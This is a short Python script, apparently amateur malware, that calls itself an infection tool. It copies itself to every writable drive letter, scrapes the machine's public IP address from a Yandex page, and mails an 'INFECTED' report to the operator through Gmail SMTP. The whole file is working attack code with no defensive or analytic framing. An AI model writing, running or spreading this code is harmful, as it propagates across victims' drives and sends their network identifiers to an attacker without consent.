'''

NAME: INTERNAL
AUTHOR: S1DAL3X
VERSION: 2.0
PYTHON: 3.6.1

Please enter your gmail login and password before using script
(login, password, login again)

'''
import os
import shutil
import socket
import smtplib
from bs4 import BeautifulSoup
from urllib.request import urlopen     

#Checking available disks for infection (disk C does not give rights)
def check_disk():
    for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
        path = letter + '://'       
        try:
            if os.path.isdir(path):
                shutil.copy('projectPython.py', path)
            else:
                pass
        except PermissionError:
            pass
    get_outside_ip()
    
#Getting outside ip
def get_outside_ip():
    url = urlopen('https://yandex.ru/internet/')        #internet.yandex give us information about PC
    soup = BeautifulSoup(url, 'html.parser')
    out_str = soup.find('div', class_='client__desc')
    out_str = str(out_str)
    ip = []
    
    #Extraction ip from data
    for symbol in out_str:
        if '1234567890.'.find(symbol) != -1:
            ip.append(symbol)
            
    outside_ip = ''.join(ip)
    report(outside_ip)
    
#Send report about success infected PC
def report(arg):
    pc_name = socket.gethostname()                      #Name PC in local network
    report_text = str(arg) + ' WAS INFECTED !!!'
    msgObject = smtplib.SMTP('smtp.gmail.com', 587)

    msgObject.starttls()
    msgObject.login('------------', '---------')
    msgObject.sendmail('123@gmail.com', '------------', str(report_text))
    msgObject.quit()
    
    
if __name__ == '__main__':
    check_disk()
